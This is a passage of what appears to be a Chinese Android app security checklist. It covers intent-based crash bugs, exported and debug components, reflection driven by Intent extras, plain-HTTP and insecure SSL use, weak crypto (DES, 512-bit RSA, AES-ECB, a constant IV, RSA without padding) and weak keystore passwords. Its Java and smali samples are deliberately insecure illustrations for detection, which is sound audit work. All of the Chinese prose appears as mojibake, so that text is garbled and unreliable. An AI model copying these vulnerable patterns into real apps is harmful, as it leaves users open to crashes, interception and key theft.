class="operator">=</span> (String) a.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">    <span class="comment">//é’ˆå¯¹å¼‚å¸¸è¿›è¡Œæ“ä½œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getIntegerArrayListExtra()ç­‰è·å–åˆ°çš„æ•°æ®æ•°ç»„å…ƒç´ å¤§å°åˆ¤æ–­ï¼Œå¯¼è‡´æ•°ç»„è®¿é—®è¶Šç•Œè€Œé€ æˆæ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; intArray = intent.getIntegerArrayListExtra(<span class="string">&quot;user_id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intArray != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        intArray.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰æ‰¾åˆ°ä»getSerializableExtra()è·å–åˆ°çš„åºåˆ—åŒ–å¯¹è±¡çš„ç±»å®šä¹‰ï¼Œå› æ­¤å¯¼è‡´å‘ç”Ÿç±»æœªå®šä¹‰çš„å¼‚å¸¸å¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line">a.getSerializableExtra(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="manifestä¸­å®šä¹‰ç»„ä»¶ä¸ºå®ç°æ£€æµ‹">manifestä¸­å®šä¹‰ç»„ä»¶ä¸ºå®ç°æ£€æµ‹</h3><p>åœ¨manifestæ–‡ä»¶ä¸­å®šä¹‰çš„ç»„ä»¶å¯¼å‡ºï¼Œä¸”æ²¡æœ‰ä»£ç å®ç°ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡ddosæ”»å‡»å¯¼è‡´appå´©æºƒ</p><p>**é£é™©ç­‰çº§ï¼š**ä¸­å±</p><p><strong>é—®é¢˜å®ä¾‹ï¼š</strong></p><p>é¦–å…ˆè·å–appæºç ä¸­æ‰€æœ‰ç±»çš„è·¯å¾„(åŒ…å+ç±»å)ï¼Œç„¶åæ£€æµ‹manifestä¸­å£°æ˜çš„æ‰€æœ‰ç»„ä»¶æ˜¯å¦å­˜åœ¨äºç±»è·¯å¾„ä¸­å³å¯</p><p><strong>å»ºè®®ï¼š</strong></p><p>åˆ é™¤manifestæ–‡ä»¶ä¸­æ— æ•ˆçš„å¯¼å‡ºç»„ä»¶</p><h3 id="Debugæˆ–Testæ•æ„Ÿæµ‹è¯•ç»„ä»¶æ³„éœ²æ£€æµ‹">Debugæˆ–Testæ•æ„Ÿæµ‹è¯•ç»„ä»¶æ³„éœ²æ£€æµ‹</h3><p>ä¸€äº›appåœ¨æ­£å¼å‘å¸ƒä¹‹å‰ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•appï¼Œéƒ½ä¼šåœ¨appé‡Œé›†æˆä¸€äº›è°ƒå¼æˆ–è€…æµ‹è¯•ç•Œé¢ï¼Œè¿™äº›æµ‹è¯•ç•Œé¢å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±æˆ–ä¸­å±</p><p><strong>é—®é¢˜å®ä¾‹</strong></p><p>éå†manifestæ–‡ä»¶ä¸­æ‰€æœ‰ç»„ä»¶çš„åç§°ï¼Œæ‰¾å‡ºæ‰€æœ‰å¸¦æœ‰debugæˆ–è€…testç­‰æµ‹è¯•å­—æ ·çš„å…³é”®å­—ç»„ä»¶ï¼Œå¹¶æ ¹æ®ç»„ä»¶çš„intent-filterå±æ€§æ„é€ intentå‘é€è®©ç»„ä»¶å¼¹å‡ºè¿›è¡Œæ£€æµ‹</p><p><strong>å»ºè®®</strong></p><p>æ­£å¼å‘å¸ƒå‰ç§»é™¤æ‰€æœ‰æµ‹è¯•ç»„ä»¶</p><h3 id="Intentä¸å®‰å…¨åå°„é£é™©æ£€æµ‹">Intentä¸å®‰å…¨åå°„é£é™©æ£€æµ‹</h3><p>é€šè¿‡Intentæ¥æ”¶çš„Extraå‚æ•°æ¥æ„é€ åå°„å¯¹è±¡ä¼šå¯¼è‡´ä»ä¸å—ä¿¡ä»»çš„æºåŠ è½½ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å·§å¦™åœ°æ„é€ è¾¾åˆ°åŠ è½½å…¶ä»–ç±»çš„ç›®çš„ã€</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜å®ä¾‹</strong></p><p>Step1ï¼šæ£€æµ‹å‡ºå¯¼å‡ºçš„ç»„ä»¶</p><p>Step2ï¼šåœ¨å¯¼å‡ºçš„ç»„ä»¶ä¸‹ï¼Œæ£€æµ‹ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šgetIntent()å’ŒClass.forName(â€œâ€¦â€)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_second);</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„intentä½¿ç”¨äº†getStringExtraæ–¹æ³•åŠ è½½äº†ä¸€ä¸ªåç§°ä¸ºclassNameçš„ç±»</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; clz = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//å°è¯•ä»¥åå°„çš„æ–¹å¼æ„é€ classNameçš„å®ä¾‹</span></span><br><span class="line"> clz = Class.forName(className);</span><br><span class="line"><span class="type">Date</span> <span class="variable">object</span> <span class="operator">=</span> (Date) clz.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(methodName);</span><br><span class="line">Toast.makeText(getApplicationContext(), method.invoke(object, <span class="literal">null</span>) + <span class="string">&quot;======&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘åå¯¹åº”çš„smaliä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/bug/intent/reflection/SecondActivity;</span>-&gt;getIntent()<span class="class">Landroid/content/Intent;</span></span><br><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/Class;</span>-&gt;forName(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Class;</span></span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®ï¼š</strong></p><ul><li>ä¸è¦é€šè¿‡Intentæ¥æ”¶çš„Extraä¼ æ’­çš„åå°„å‡½æ•°</li><li>å°†æ¥å—åå°„çš„ç»„ä»¶è®¾ç½®ä¸ºéå¯¼å‡ºç»„ä»¶</li></ul><h2 id="WebViewç»„ä»¶å®‰å…¨">WebViewç»„ä»¶å®‰å…¨</h2><h2 id="SQLiteå®‰å…¨">SQLiteå®‰å…¨</h2><h2 id="ç½‘ç»œé€šä¿¡å®‰å…¨">ç½‘ç»œé€šä¿¡å®‰å…¨</h2><h3 id="SSLè¿æ¥æ£€æµ‹">SSLè¿æ¥æ£€æµ‹</h3><p>URLæ²¡æœ‰ä½¿ç”¨SSLå®‰å…¨åè®®</p><p>**é£é™©ç­‰çº§ï¼š**æç¤º</p><p>é—®é¢˜å®ä¾‹ï¼š</p><p>æ‰€æœ‰ä¸ä½¿ç”¨httpsçš„urlå­—ç¬¦ä¸²å¸¸é‡</p><p><strong>å»ºè®®</strong>ï¼š</p><ul><li>å¦‚æœä½¿ç”¨httpsåè®®åŠ è½½urlï¼Œåº”ç”¨è¿›è¡Œè¯ä¹¦æ ¡éªŒï¼Œé˜²æ­¢è®¿é—®çš„é¡µé¢è¢«ç¯¡æ”¹æŒ‚é©¬</li><li>å¦‚æœä½¿ç”¨httpåè®®åŠ è½½urlï¼Œåº”è¿›è¡Œç™½åå•è¿‡æ»¤ï¼Œå®Œæ•´æ€§æ ¡éªŒç­‰é˜²æ­¢è®¿é—®çš„é¡µé¢è¢«ç¯¡æ”¹</li><li>å¦‚æœåŠ è½½æœ¬åœ°htmlï¼Œåº”å°†htmlæ–‡ä»¶å†…ç½®åœ¨apkä¸­ï¼Œä»¥åŠè¿›è¡Œå¯¹htmlé¡µé¢å®Œæ•´æ€§çš„æ ¡éªŒ</li></ul><h3 id="SSLä¸å®‰å…¨ç»„ä»¶æ£€æµ‹">SSLä¸å®‰å…¨ç»„ä»¶æ£€æµ‹</h3><p>SSLCertificateSocketFactory#getInsecureæ–¹æ³•æ— æ³•æ‰§è¡ŒSSLéªŒè¯æ£€æŸ¥ï¼Œä½¿å¾—ç½‘ç»œé€šä¿¡é­å—ä¸­é—´äººæ”»å‡»ã€‚</p><p>**é£é™©ç­‰çº§ï¼š**æç¤º</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†SSLCertificateSocketFactory#getInsecureæ–¹æ³•</p><p><strong>å»ºè®®</strong>ï¼š</p><p>ç§»é™¤SSLCertificateSocketFactory#getInsecureæ–¹æ³•</p><h3 id="HttpHostæ£€æµ‹">HttpHostæ£€æµ‹</h3><p><code>HttpHost target = new HttpHost(uri.getHost(), uri.getPort(), HttpHost.DEFAULT_SCHEME_NAME);</code></p><p>HttpHost.DEFAULT_SCHEME_NAMEé»˜è®¤æ˜¯httpï¼Œä¸å®‰å…¨ã€‚</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>æ£€æµ‹HttpHostä½¿ç”¨çš„å‚æ•°æ˜¯å¦æ˜¯<code>http</code></p><p><strong>å»ºè®®</strong>ï¼š</p><p>æ”¹æˆä½¿ç”¨<code>https</code></p><h3 id="HttpURLConnectionæ¼æ´æ£€æµ‹">HttpURLConnectionæ¼æ´æ£€æµ‹</h3><p>åœ¨<code>Android 2.2</code>ç‰ˆæœ¬ä¹‹å‰ï¼ŒHttpURLConnectionä¸€ç›´å­˜åœ¨ç€ä¸€äº›ä»¤äººåŒçƒ¦çš„bugã€‚æ¯”å¦‚è¯´å¯¹ä¸€ä¸ªå¯è¯»çš„InputStreamè°ƒç”¨close()æ–¹æ³•æ—¶ï¼Œå°±æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿æ¥æ± å¤±æ•ˆäº†ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä½å±</code></p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>åˆ¤æ–­ä½¿ç”¨HttpURLConnectionæ˜¯å¦è¿›è¡Œäº†ç‰ˆæœ¬åˆ¤æ–­</p><p><strong>å»ºè®®</strong>ï¼š</p><p>åˆ¤æ–­Androidç‰ˆæœ¬ï¼Œå¹¶è®¾ç½®http.keepAliveä¸ºfalseã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">disableConnectionReuseIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// è§£å†³Android Froyo(Androdi 2.2)ç‰ˆæœ¬ä¹‹å‰ï¼Œåœ¨HTTPè¿æ¥é‡ç”¨æ—¶ä¼šå‡ºç°çš„BUG</span></span><br><span class="line">    <span class="keyword">if</span> (Integer.parseInt(Build.VERSION.SDK) &lt; Build.VERSION_CODES.FROYO) &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;http.keepAlive&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç½‘ç»œç«¯å£å¼€æ”¾å¨èƒæ£€æµ‹">ç½‘ç»œç«¯å£å¼€æ”¾å¨èƒæ£€æµ‹</h3><p>Androidåº”ç”¨é€šå¸¸ä½¿ç”¨PF_UNIXï¼ŒPF_INETï¼ŒPF_NETLINKç­‰ä¸åŒdomainçš„socketæ¥è¿›è¡Œæœ¬åœ°IPCæˆ–è€…è¿œç¨‹ç½‘ç»œé€šä¿¡ï¼Œè¿™äº›æš´éœ²åœ¨socketä»£è¡¨äº†æ½œåœ¨çš„æœ¬åœ°æˆ–è€…è¿œç¨‹æ”»å‡»é¢ï¼Œå†å²ä¸Šä¹Ÿå‡ºç°è¿‡ä¸å°‘åˆ©ç”¨socketè¿›è¡Œæ‹’ç»æœåŠ¡ï¼Œrootææƒæˆ–è€…è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ¡ˆä¾‹ï¼Œç‰¹åˆ«æ˜¯PF_INETç±»å‹çš„ç½‘ç»œsocketï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œä¸Androidåº”ç”¨é€šä¿¡ï¼Œå…¶åŸæœ¬ç”¨äºlinuxç¯å¢ƒä¸‹å¼€æ”¾ç½‘ç»œæœåŠ¡ï¼Œç”±äºç¼ºä¹å¯¹ç½‘ç»œè°ƒç”¨è€…èº«ä»½æˆ–è€…æœ¬åœ°è°ƒç”¨è€…idï¼Œpermissionç­‰ç»†ç²’åº¦çš„å®‰å…¨æ£€æŸ¥æœºåˆ¶ï¼Œåœ¨å®ç°ä¸å½“çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥çªç ´Androidæ²™ç®±é™åˆ¶ï¼Œä»¥è¢«æ”»å‡»åº”ç”¨çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸å‡ºç°æ¯”è¾ƒä¸¥é‡çš„æ¼æ´</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>å»ºè®®</strong></p><p>ç›´æ¥ä¼ é€’å‘½ä»¤å­—æˆ–è€…é—´æ¥å¤„ç†æœ‰æ•æ„Ÿä¿¡æ¯æˆ–æ“ä½œæ—¶ï¼Œé¿å…ä½¿ç”¨socketå®ç°ï¼Œä½¿ç”¨èº«ä»½è®¤è¯ï¼Œé‰´æƒï¼Œå‚æ•°æ ¡éªŒç­‰å®‰å…¨è¦ç´ ã€‚</p><h2 id="å¼±åŠ å¯†é£é™©æ£€æµ‹">å¼±åŠ å¯†é£é™©æ£€æµ‹</h2><h3 id="DESå¼±åŠ å¯†ç®—æ³•é£é™©æ£€æµ‹">DESå¼±åŠ å¯†ç®—æ³•é£é™©æ£€æµ‹</h3><p>å®‰å…¨æ€§è¦æ±‚é«˜çš„åº”ç”¨ç¨‹åºå¿…é¡»é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„æˆ–è€…å¼ºåº¦å¼±çš„åŠ å¯†ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œæ•°æ®åŠ å¯†æ ‡å‡†ç®—æ³•DES(å¯†é’¥é»˜è®¤æ˜¯56ä½ï¼Œç®—æ³•åŠå…¬å¼€ï¼Œè¿­ä»£æ¬¡æ•°å°‘)æ˜¯æåº¦ä¸å®‰å…¨çš„ã€‚</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>ä½¿ç”¨deså¼±åŠ å¯†ç®—æ³•ï¼Œé£é™©ä»£ç æ ·ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼&quot;DES/(\w){3}/.+Padding&quot;åŒ¹é…å­—ç¬¦ä¸²å¸¸é‡ã€‚</p><p><strong>å»ºè®®ï¼š</strong></p><p>å»ºè®®ä½¿ç”¨å®‰å…¨æ€§æ›´é«˜çš„AESåŠ å¯†ç®—æ³•</p><h3 id="ä¸å®‰å…¨çš„å¯†é’¥é•¿åº¦é£é™©æ£€æµ‹">ä¸å®‰å…¨çš„å¯†é’¥é•¿åº¦é£é™©æ£€æµ‹</h3><p>åœ¨ä½¿ç”¨RSAåŠ å¯†æ—¶ï¼ŒåŠ å¯†é•¿åº¦å°äº512bitï¼Œå°äº512bitçš„å¯†é’¥å¾ˆå®¹æ˜“è¢«ç ´è§£ï¼Œè®¡ç®—å‡ºå¯†é’¥</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">getRSAKey</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">    keyGen.initialize(<span class="number">512</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKeyPair();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„smaliä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;getInstance(Ljava<span class="regexp">/lang/</span>String;)Ljava<span class="regexp">/security/</span>KeyPairGenerator;</span><br><span class="line"></span><br><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;initialize(I)V</span><br></pre></td></tr></table></figure><p>é€šè¿‡åŒ¹é…ä¸Šè¿°å‡½æ•°ï¼Œå¹¶æ ¹æ®initializeå‡½æ•°çš„å‚æ•°å€¼åˆ¤æ–­ã€‚</p><p><strong>å»ºè®®</strong>ï¼š</p><p>åœ¨ä½¿ç”¨RSAåŠ å¯†æ—¶ï¼Œå»ºè®®å¯†é’¥é•¿åº¦å¤§äº1024bit</p><h3 id="AES-ECBå¼±åŠ å¯†é£é™©æ£€æµ‹">AES-ECBå¼±åŠ å¯†é£é™©æ£€æµ‹</h3><p>AESçš„ECBåŠ å¯†æ¨¡å¼å®¹æ˜“é­åˆ°å­—å…¸æ”»å‡»ï¼Œå®‰å…¨æ€§ä¸å¤Ÿ</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼Œæ£€æµ‹ä»¥ä¸‹å‡½æ•°ï¼š</p><ul><li>getInstance(String transformation)</li><li>getInstance(String transformation, String provider)</li><li>getInstance(String transformation, Provider provider)</li></ul><p>ç¬¬äºŒæ­¥ï¼Œæ£€æµ‹ä¸Šè¿°å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å€¼å‡ºç°ä»¥ä¸‹æƒ…å†µçš„ä»»æ„ä¸€ç§ï¼Œå³å¯è®¤ä¸ºè¯¥æ£€æµ‹é¡¹ä¸å®‰å…¨ï¼Œæ ‡è®°ä¸º<code>ä½å±</code>ã€‚</p><ul><li>â€œAESâ€ï¼ŒAndroidæä¾›çš„AESåŠ å¯†ç®—æ³•APIé»˜è®¤ä½¿ç”¨ECBæ¨¡å¼</li><li>â€œDESâ€ï¼ŒDESé»˜è®¤æ˜¯56ä½åŠ å¯†å¯†é’¥ï¼Œå·²ç»ä¸å®‰å…¨</li><li>â€œAES/ECB/xxxâ€</li><li>â€œDES/ECB/xxxâ€</li><li>â€œDESede/ECB/xxxâ€</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®</strong></p><p>é¿å…ä½¿ç”¨ECBæ¨¡å¼ï¼Œå»ºè®®ä½¿ç”¨CBCæ¨¡å¼</p><h3 id="IVParameterSpecä¸å®‰å…¨åˆå§‹åŒ–å‘é‡æ£€æµ‹">IVParameterSpecä¸å®‰å…¨åˆå§‹åŒ–å‘é‡æ£€æµ‹</h3><p>ä½¿ç”¨IVParameterSpecå‡½æ•°ï¼Œå¦‚æœä½¿ç”¨äº†å›ºå®šçš„åˆå§‹åŒ–å‘é‡ï¼Œé‚£ä¹ˆå¯†ç æ–‡æœ¬å¯é¢„æµ‹æ€§é«˜å¾—å¤šï¼Œå®¹æ˜“æ”¶åˆ°å­—å…¸æ”»å‡»ã€‚</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><p>åˆå§‹åŒ–å‘é‡æ—¶ï¼Œä½¿ç”¨äº†ç¡¬ç¼–ç åˆ°ç¨‹åºçš„å¸¸é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] iv = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv)</span><br></pre></td></tr></table></figure><p>åŒ¹é…<code>Ljavax/crypto/spec/IvParameterSpec;-&gt;&lt;init&gt;([B)V</code>å‡½æ•°</p><p><strong>å»ºè®®</strong></p><p>IVParameterSpecåˆå§‹åŒ–æ—¶ï¼Œä¸ä½¿ç”¨å¸¸é‡vectorã€‚</p><h3 id="RSAä¸­ä¸ä½¿ç”¨Paddingé£é™©æ£€æµ‹">RSAä¸­ä¸ä½¿ç”¨Paddingé£é™©æ£€æµ‹</h3><p>ä½¿ç”¨RSAå…¬é’¥æ—¶é€šå¸¸ä¼šç»‘å®šä¸€ä¸ªpaddingï¼ŒåŸå› æ˜¯ä¸ºäº†é˜²æ­¢ä¸€äº›ä¾èµ–äºno paddingæ—¶å¯¹RSAç®—æ³•çš„æ”»å‡»</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">rsa</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    rsa = javax.crypto.Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.security.NoSuchAlgorithmException e) &#123;&#125;</span><br><span class="line">  <span class="keyword">catch</span> (javax.crypto.NoSuchPaddingException e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ç”¨æ­£åˆ™è¡¨è¾¾å¼<code>RSA/(\w)&#123;3&#125;/NoPadding</code>åŒ¹é…å­—ç¬¦ä¸²å¸¸é‡</p><p><strong>å»ºè®®ï¼š</strong></p><p>å»ºè®®ä½¿ç”¨Paddingæ¨¡å¼ã€‚</p><h3 id="KeyStoreå¼±å¯†ç é£é™©æ£€æµ‹">KeyStoreå¼±å¯†ç é£é™©æ£€æµ‹</h3><p>keytoolæ˜¯ä¸€ä¸ªjavaæ•°æ®è¯ä¹¦çš„ç®¡ç†å·¥å…·ï¼Œ</p><p>keytoolå°†å¯†é’¥(keyï¼Œç§é’¥å’Œå…¬é’¥é…å¯¹)å’Œè¯ä¹¦(certificates)å­˜åœ¨ä¸€ä¸ªç§°ä¸ºkeystoreçš„æ–‡ä»¶ä¸­ï¼Œå¹¶é€šè¿‡å¯†ç ä¿æŠ¤keystoreä¸­çš„å¯†é’¥ã€‚å¦‚æœå¯†ç è®¾ç½®è¿‡äºç®€å•ï¼Œä¾‹å¦‚ï¼š123456ã€androidç­‰ï¼Œåˆ™ä¼šå¯¼è‡´keystoreæ–‡ä»¶çš„ç§é’¥æ³„éœ²ï¼Œä»è€Œå¯¼è‡´ä¸€ç³»åˆ—çš„ä¿¡æ¯æ³„éœ²é£é™©ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>é«˜å±</code></p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><p>æ–¹æ³•ä¸€ï¼‰åŸºäºkeytoolå‘½ä»¤è¡Œæ£€æµ‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">keytool</span> -list -keystore <span class="literal">debug</span>.keystore</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥ä¸å®‰å…¨çš„å¼±å¯†ç ï¼Œè‹¥æ­£å¸¸è¾“å‡ºï¼Œè¡¨æ˜è¯¥keystoreæ–‡ä»¶å­˜åœ¨å¼±å¯†ç 